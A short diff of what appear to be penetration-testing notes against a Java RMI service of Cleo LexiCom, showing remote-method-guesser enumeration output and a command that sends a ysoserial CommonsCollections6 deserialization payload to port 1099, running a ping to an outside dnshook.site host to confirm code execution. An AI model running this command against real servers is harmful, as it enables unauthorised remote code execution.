@@ -118,10 +118,12 @@ java -jar rmg-5.1.0-jar-with-dependencies.jar serial xx 1099 CommonsCollections6
 4------------------------------------------------------------------------
 
 [+]     - com.cleo.lexicom.LexiCom
-[+]             --> com.cleo.lexicom.LexRemote_Stub (unknown class)
+[+]             --> com.cleo.lexicom.LexRemote_Stub 
 
 method discovered :
 String getProperty(String property)
 
 
 java -jar rmg-5.1.0-jar-with-dependencies.jar serial xx 1099 CommonsCollections6 'ping xx.dnshook.site' --signature 'String getProperty(String property)' --bound-name 'com.cleo.lexicom.LexiCom'  --stack-trace --yso /root/Desktop/yso/ysoserial-all.jar
+
+
